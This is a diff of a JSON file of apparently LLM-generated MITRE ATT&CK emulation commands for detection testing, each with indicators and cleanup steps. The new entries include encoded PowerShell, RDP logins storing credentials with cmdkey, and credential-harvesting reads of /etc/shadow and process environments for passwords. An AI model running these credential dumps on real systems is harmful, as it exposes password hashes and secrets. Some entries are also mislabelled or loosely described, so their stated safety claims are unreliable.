-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:40.847339",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.88,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "7305e3f6-2317-42fe-bb93-80477900c864",
+        "command_id": "244009fb-b64c-4ceb-ac21-00cc1849500f",
         "ttp_id": "real-T1059.001",
         "mitre_attack_id": "T1059.001",
         "technique_name": "PowerShell",
         "tactic": "Execution",
         "platform": "windows",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Execute a Base64 Encoded PowerShell Command (T1059.001)",
+        "command": "powershell -EncodedCommand \"JAB0AGUAcwB0ACAAPQAgACcASABlAGwAbABvACAAZgByAG8AbQAgAGIAYQBzAGUANgA0ACcACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAJAB0AGUAcwB0AA==\"",
+        "explanation": "This command uses the -EncodedCommand parameter to execute a base64 encoded PowerShell command. The encoded string decodes to a simple script that writes the string 'Hello from base64' to the console. This demonstrates how attackers can obfuscate their commands. The -EncodedCommand parameter is a common method for bypassing basic security controls. The example uses a pre-encoded string, which can be easily generated from any simple PowerShell command for testing purposes.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Process execution of powershell.exe",
+          "Output 'Hello from base64' in the console.",
+          "Event log entries related to PowerShell script execution (e.g., Event ID 400, 4104 depending on logging configuration).",
+          "Potential detection based on the use of -EncodedCommand"
         ],
         "prerequisites": [
-          "Registry access"
+          "None (the command is self-contained)."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "None (the command leaves no persistent artifacts).",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:57.312845",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:40.847339",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.88,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "06798f0e-c5b7-4068-8938-e1df7385ce64",
+        "command_id": "60996acb-b468-4f62-acc6-1bc92c85997a",
         "ttp_id": "real-T1059.001",
         "mitre_attack_id": "T1059.001",
         "technique_name": "PowerShell",
         "tactic": "Execution",
         "platform": "linux",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Simulate PowerShell execution using pwsh to download and execute a harmless script",
+        "command": "pwsh -c \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/attack-navigator/master/src/data/enterprise-attack.json' -OutFile '/tmp/attack_data.json';\"",
+        "explanation": "This command simulates PowerShell execution on Linux using `pwsh`. It uses `Invoke-WebRequest` (a PowerShell cmdlet) to download the MITRE ATT&CK Enterprise ATT&CK JSON data from GitHub and saves it to `/tmp/attack_data.json`. This simulates the common adversary behavior of downloading a file from a remote server. This is safe because it downloads a legitimate, public file.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Process creation: `pwsh`",
+          "Network connection to raw.githubusercontent.com",
+          "File creation: `/tmp/attack_data.json`"
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "pwsh must be installed on the Linux system (e.g., `sudo apt install powershell` on Debian/Ubuntu, or follow instructions for your distribution)",
+          "Internet connectivity is required."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "Remove the downloaded file: `rm /tmp/attack_data.json`",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:57.627057",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:44.705143",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.88,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "7df842f6-46cf-414b-b584-47c9083a8e22",
+        "command_id": "e153ddc7-d7a8-4f9a-ae95-0c8399190ba5",
         "ttp_id": "real-T1059.001",
         "mitre_attack_id": "T1059.001",
         "technique_name": "PowerShell",
         "tactic": "Execution",
         "platform": "linux",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Simulate PowerShell execution using pwsh to display system information",
+        "command": "pwsh -c \"Get-ComputerInfo | Out-String\"",
+        "explanation": "This command simulates PowerShell execution on Linux using `pwsh`. It runs the `Get-ComputerInfo` cmdlet, which retrieves system information, and pipes the output to `Out-String` to format the output. This simulates an adversary collecting system information. This is safe because it only displays local system info.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Process creation: `pwsh`",
+          "Process execution: `Get-ComputerInfo`",
+          "Output to the console of system information."
         ],
         "prerequisites": [
-          "Registry access"
+          "pwsh must be installed on the Linux system (e.g., `sudo apt install powershell` on Debian/Ubuntu, or follow instructions for your distribution)"
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "No cleanup required, as the command doesn't create any files or modify the system in a persistent way.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:57.627057",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:44.705143",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.88,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "75549a28-89d3-4164-a493-ed86e22f1a09",
+        "command_id": "3199aa16-d770-4b84-8be9-7954dcc1ba28",
         "ttp_id": "real-T1021.001",
         "mitre_attack_id": "T1021.001",
         "technique_name": "Remote Desktop Protocol",
         "tactic": "Lateral Movement",
         "platform": "windows",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Establish RDP Connection to a Target System",
+        "command": "mstsc /v:<target_ip_or_hostname> /admin",
+        "explanation": "This command attempts to establish a remote desktop connection to the specified target system using the mstsc.exe utility (Microsoft Terminal Services Client). The /v parameter specifies the target IP address or hostname. The /admin switch connects to the console session (session 0) of the target system, which is often used by administrators. This simulates an attacker leveraging valid credentials to access a system.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Event ID 4624 (An account was successfully logged on) on the target system, indicating a successful logon.",
+          "Event ID 4778 (A session was reconnected to a Window station) on the target system, specifically if the console session is used.",
+          "Event ID 4779 (A session was disconnected from a Window station) on the target system when the connection is terminated.",
+          "Network traffic on port 3389 (default RDP port) between the attacking and target systems.",
+          "mstsc.exe process execution on the attacking system.",
+          "Remote desktop session established on the attacking system (visible if the attacker has a GUI)."
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "The attacking system must have network connectivity to the target system.",
+          "Valid credentials (username and password) for an account on the target system are required (or the target system must allow connections from the attacker's system without credentials).",
+          "RDP must be enabled on the target system.",
+          "Firewall rules on the target system must allow incoming RDP connections on port 3389 (or a custom port if configured)."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "Close the RDP session on the attacking system. If you used compromised credentials, reset the password of the compromised account on the target system to prevent unauthorized access. Remove any persistent access mechanisms that may have been established during the simulated attack (e.g., scheduled tasks).",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:57.942631",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:52.201761",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.838,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "68d40b84-66c2-4f7f-9042-d5aace8c8c6b",
+        "command_id": "d3b7996e-d004-43f8-a3f8-a9f4c7125a52",
         "ttp_id": "real-T1021.001",
         "mitre_attack_id": "T1021.001",
         "technique_name": "Remote Desktop Protocol",
         "tactic": "Lateral Movement",
         "platform": "windows",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "RDP Connection with Specified Credentials",
+        "command": "cmdkey /generic:<target_ip_or_hostname> /user:<username> /pass:<password> && mstsc /v:<target_ip_or_hostname> /admin",
+        "explanation": "This command first uses the cmdkey utility to store the provided credentials (username and password) for the specified target system. cmdkey is a legitimate Windows utility for managing stored credentials. Then, it uses mstsc.exe to establish an RDP connection to the target machine.  This simulates an attacker using stolen or obtained credentials to access a target system via RDP.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Event ID 4624 (An account was successfully logged on) on the target system.",
+          "Event ID 4778 (A session was reconnected to a Window station) on the target system.",
+          "Event ID 4779 (A session was disconnected from a Window station) on the target system.",
+          "Network traffic on port 3389.",
+          "mstsc.exe process execution on the attacking system.",
+          "cmdkey.exe process execution on the attacking system.",
+          "Stored credentials in the Credential Manager (accessible via Control Panel) on the attacking system (if the attack is successful and credentials are saved)."
         ],
         "prerequisites": [
-          "Registry access"
+          "Network connectivity between the attacking and target systems.",
+          "The username and password must be valid credentials for an account on the target system.",
+          "RDP must be enabled on the target system.",
+          "Firewall rules on the target system must allow incoming RDP connections.",
+          "The attacker must have the appropriate permissions to run cmdkey.exe."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "Close the RDP session. Use cmdkey /delete:<target_ip_or_hostname> to remove the stored credentials from the attacking system's credential manager. Reset the password of the compromised account on the target system.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:57.942631",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:52.201761",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.838,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "2d560784-970d-4c15-9afb-c44a2addc3f5",
+        "command_id": "ef0e33a1-831d-4e7b-bdea-84d83b4cf6aa",
         "ttp_id": "real-T1021.001",
         "mitre_attack_id": "T1021.001",
         "technique_name": "Remote Desktop Protocol",
         "tactic": "Lateral Movement",
         "platform": "linux",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Simulate RDP lateral movement using Remmina (Safe Mode)",
+        "command": "remmina -c /dev/null",
+        "explanation": "This command simulates the launching of an RDP client (Remmina) without actually connecting.  `-c /dev/null` is used to prevent any actual connection attempts, making it safe.  This represents the initial stage of lateral movement, where the attacker might prepare to connect to a remote host.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Process creation: remmina",
+          "Potentially, network connections attempts (even if to localhost or a non-existent host) if Remmina configuration files are present (check /home/<user>/.remmina/ for configuration files, though none should be generated by this command)",
+          "User activity: User launching remmina"
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "Remmina RDP client installed on the attacking system (e.g., sudo apt install remmina)",
+          "User logged in to the attacking system"
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "No cleanup required as no actual connection is made.  Remmina is simply launched.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:58.255890",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:58.411646",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.838,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "aeb2aefb-7697-41f3-81e6-974da5da12c0",
+        "command_id": "87d79adc-28fa-4a72-b6b6-41287b32a37e",
         "ttp_id": "real-T1021.001",
         "mitre_attack_id": "T1021.001",
         "technique_name": "Remote Desktop Protocol",
         "tactic": "Lateral Movement",
         "platform": "linux",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Simulate RDP reconnaissance using `rdesktop` (Safe Mode)",
+        "command": "rdesktop -g 1024x768 -u testuser -p password -s /bin/false 127.0.0.1",
+        "explanation": "This command simulates an RDP connection attempt to localhost using `rdesktop`, a common RDP client for Linux. The `-g 1024x768` sets the display resolution. `-u testuser` and `-p password` specify the username and password (which are dummy values). The `-s /bin/false` option is crucial for safety; it specifies that a shell command `/bin/false` should be executed after successful logon. `/bin/false` immediately exits, preventing any further actions on the target system and making the command safe for testing.  Finally, `127.0.0.1` specifies the target IP address (localhost). This command represents an attacker attempting to connect but not actually executing any commands on the target.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Process creation: rdesktop",
+          "Network connection to localhost (port 3389)",
+          "Authentication attempts (check logs for failed or successful login attempts on the target if RDP is enabled on localhost - unlikely by default)",
+          "User activity: User launching rdesktop"
         ],
         "prerequisites": [
-          "Registry access"
+          "rdesktop installed on the attacking system (e.g., sudo apt install rdesktop)",
+          "User logged in to the attacking system",
+          "RDP service running on target (localhost, unlikely by default)",
+          "Ensure no actual RDP server is running on localhost. This command is designed to be safe and fail gracefully."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "No cleanup is necessary, as the command is designed to terminate quickly and safely. No files should be created or modified on the target system.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:58.255890",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:58.411646",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.838,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "c5e89fb8-a6c7-409e-9445-cb2fc943c7c9",
+        "command_id": "2070631e-c06c-444f-933e-b49cd4dfebc7",
         "ttp_id": "real-T1003",
         "mitre_attack_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "Credential Access",
         "platform": "windows",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Credential Dumping Simulation",
+        "command": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount | Select-Object Name\"",
+        "explanation": "Simulates credential discovery using WMI",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "WMI queries",
+          "User account enumeration"
         ],
         "prerequisites": [
           "PowerShell available",
-          "User privileges"
+          "WMI access"
         ],
-        "cleanup": "No cleanup required for mock command",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:58.567134",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "cleanup": "No cleanup required",
+        "source": "windows_credential",
+        "generated_at": "2025-11-01T14:37:30.213832",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.833,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "8ae8755b-fb9d-47ba-be05-489cd4f05958",
-        "ttp_id": "real-T1003",
-        "mitre_attack_id": "T1003",
-        "technique_name": "OS Credential Dumping",
-        "tactic": "Credential Access",
-        "platform": "windows",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
-        "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
-        ],
-        "prerequisites": [
-          "Registry access"
-        ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:58.567134",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
-        "confidence_score": 0.833,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "53888752-80df-4273-80e1-51d94e0d733c",
+        "command_id": "afa82799-5f45-4d51-a6e3-1ce46f6287b5",
         "ttp_id": "real-T1003",
         "mitre_attack_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "Credential Access",
         "platform": "linux",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Dump Shadow File Credentials (Linux)",
+        "command": "sudo cat /etc/shadow | grep -v '!'",
+        "explanation": "This command attempts to dump password hashes from the /etc/shadow file. The /etc/shadow file stores password hashes for user accounts.  `grep -v '!'` filters out accounts that are locked (indicated by an exclamation mark in the password field). This is a common method for attackers to obtain credentials. This command requires root privileges (using `sudo`).",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Suspicious use of `cat /etc/shadow`.",
+          "Use of `grep` to filter the shadow file.",
+          "Presence of password hash strings in command output.",
+          "Successful execution of `sudo` command with a privileged user."
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "Root or sudo privileges for the user executing the command.",
+          "A Linux system with a /etc/shadow file (standard on most Linux distributions)."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "No cleanup is strictly necessary. The command only reads a file. Ensure the test user's sudo privileges are properly configured after testing if necessary.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:58.880739",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:37:34.215297",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.833,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "d20af695-8a1b-4d59-a2a9-2be453b0cc13",
+        "command_id": "fdafe9ba-980b-432f-b24b-0d1bc8a7997d",
         "ttp_id": "real-T1003",
         "mitre_attack_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "Credential Access",
         "platform": "linux",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Accessing the /proc filesystem for password information",
+        "command": "sudo cat /proc/*/environ | grep -i 'password' ",
+        "explanation": "This command searches the /proc filesystem for environment variables that may contain passwords. The /proc filesystem contains process information. Attackers may attempt to access the /proc filesystem to look for sensitive information. The command uses `cat` to read the contents of environment variables and `grep -i 'password'` to search for any occurrences of 'password' (case-insensitive). This command requires `sudo` because of the restrictions placed on accessing process information.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Suspicious use of `cat` on files within /proc.",
+          "Use of `grep` to search for password-related strings.",
+          "Output containing environment variables from running processes.",
+          "Successful execution of `sudo` command with a privileged user."
         ],
         "prerequisites": [
-          "Registry access"
+          "Root or sudo privileges for the user executing the command.",
+          "A Linux system with a /proc filesystem (standard on most Linux distributions)."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "No cleanup is strictly necessary. The command only reads files. Ensure the test user's sudo privileges are properly configured after testing if necessary.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:58.880739",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:37:34.215297",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.833,
         "safety_level": "medium",
         "validated": true
@@ -695,23 +722,23 @@
     "errors": [],
     "statistics": {
       "total_ttps_processed": 6,
-      "total_commands_generated": 24,
+      "total_commands_generated": 23,
       "commands_by_platform": {
-        "windows": 12,
+        "windows": 11,
         "linux": 12
       },
       "commands_by_tactic": {
-        "Credential Access": 8,
+        "Credential Access": 7,
         "Lateral Movement": 8,
         "Initial Access": 4,
         "Execution": 4
       },
       "generation_errors": 0,
       "safety_violations": 0,
-      "successful_generations": 24,
-      "avg_generation_time_ms": 622.75,
+      "successful_generations": 23,
+      "avg_generation_time_ms": 33014.3925,
       "llm_api_calls": 12,
-      "last_generation_time": "2025-11-01T13:55:58.880739"
+      "last_generation_time": "2025-11-01T14:37:34.215297"
     }
   }
 }
